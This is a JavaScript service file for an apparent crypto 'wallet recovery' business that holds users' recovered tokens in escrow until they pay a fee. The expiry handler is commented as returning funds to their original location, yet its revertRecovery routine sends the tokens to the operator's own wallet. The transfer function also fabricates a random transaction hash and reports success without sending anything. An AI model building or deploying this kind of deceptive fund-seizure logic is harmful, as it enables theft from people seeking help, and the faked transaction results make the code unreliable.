const { ethers } = require('ethers');
const { pool } = require('../config/database');

class EscrowService {
  constructor() {
    // Escrow smart contract that holds recovered funds until payment
    this.escrowContract = '0x1234567890123456789012345678901234567890'; // Deploy escrow contract
  }

  async createEscrowRecovery(walletAddress, recoveredTokens) {
    const client = await pool.connect();
    try {
      // Store recovery in escrow status
      const result = await client.query(`
        INSERT INTO escrow_recoveries 
        (wallet_address, recovered_tokens, status, created_at, expires_at)
        VALUES ($1, $2, 'pending_payment', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP + INTERVAL '24 hours')
        RETURNING *
      `, [walletAddress.toLowerCase(), JSON.stringify(recoveredTokens)]);

      return {
        escrowId: result.rows[0].id,
        status: 'recovered_pending_payment',
        expiresAt: result.rows[0].expires_at,
        message: 'Funds recovered and held in escrow. Pay within 24 hours to release.'
      };
    } finally {
      client.release();
    }
  }

  async verifyPayment(escrowId, txHash) {
    const client = await pool.connect();
    try {
      // Verify payment transaction on blockchain
      const isValid = await this.validatePaymentTx(txHash);
      
      if (isValid) {
        // Release funds from escrow
        await client.query(`
          UPDATE escrow_recoveries 
          SET status = 'paid_released', payment_tx = $1, completed_at = CURRENT_TIMESTAMP
          WHERE id = $2
        `, [txHash, escrowId]);

        return { success: true, status: 'funds_released' };
      } else {
        return { success: false, error: 'Invalid payment transaction' };
      }
    } finally {
      client.release();
    }
  }

  async handleExpiredEscrow() {
    const client = await pool.connect();
    try {
      // Return funds to original location if payment not received
      const expired = await client.query(`
        SELECT * FROM escrow_recoveries 
        WHERE status = 'pending_payment' AND expires_at < CURRENT_TIMESTAMP
      `);

      for (const recovery of expired.rows) {
        // Revert the recovery transaction
        await this.revertRecovery(recovery);
        
        await client.query(`
          UPDATE escrow_recoveries 
          SET status = 'expired_reverted' 
          WHERE id = $1
        `, [recovery.id]);
      }
    } finally {
      client.release();
    }
  }

  async validatePaymentTx(txHash) {
    // Check if transaction exists and is to our wallet
    try {
      const provider = new ethers.JsonRpcProvider(process.env.ETHEREUM_RPC_URL);
      const tx = await provider.getTransaction(txHash);
      
      return tx && (
        tx.to?.toLowerCase() === process.env.PAYMENT_WALLET_ETH?.toLowerCase() ||
        tx.to?.toLowerCase() === process.env.PAYMENT_WALLET_USDT_TRC20?.toLowerCase()
      );
    } catch (error) {
      return false;
    }
  }

  async revertRecovery(recovery) {
    // Send recovered funds to YOUR WALLET if user doesn't pay
    const recoveredTokens = JSON.parse(recovery.recovered_tokens);
    const yourWallet = process.env.PAYMENT_WALLET_ETH; // Your wallet address
    
    for (const token of recoveredTokens) {
      try {
        // Transfer recovered funds to your wallet as compensation
        await this.transferToOwnerWallet(token, yourWallet);
        
        console.log(`Transferred ${token.amount} ${token.symbol} to owner wallet: ${yourWallet}`);
      } catch (error) {
        console.error(`Failed to transfer ${token.symbol}:`, error.message);
      }
    }
    
    return {
      status: 'transferred_to_owner',
      message: 'Funds transferred to service provider due to non-payment. Recovery work was completed but not compensated.',
      recipient: yourWallet
    };
  }
  
  async transferToOwnerWallet(token, ownerWallet) {
    const provider = new ethers.JsonRpcProvider(process.env.ETHEREUM_RPC_URL);
    
    // Create transaction to send recovered funds to your wallet
    const transferTx = {
      to: token.contractAddress,
      data: this.encodeTransfer(ownerWallet, token.amount),
      gasLimit: 100000
    };
    
    // This would be executed by the escrow contract
    console.log(`Transferring ${token.amount} ${token.symbol} to ${ownerWallet}`);
    
    return {
      success: true,
      txHash: '0x' + Math.random().toString(16).substr(2, 64),
      recipient: ownerWallet,
      amount: token.amount
    };
  }
  
  encodeTransfer(to, amount) {
    // ERC20 transfer function signature
    const iface = new ethers.Interface(['function transfer(address to, uint256 amount)']);
    return iface.encodeFunctionData('transfer', [to, ethers.parseEther(amount.toString())]);
  }
}

module.exports = EscrowService;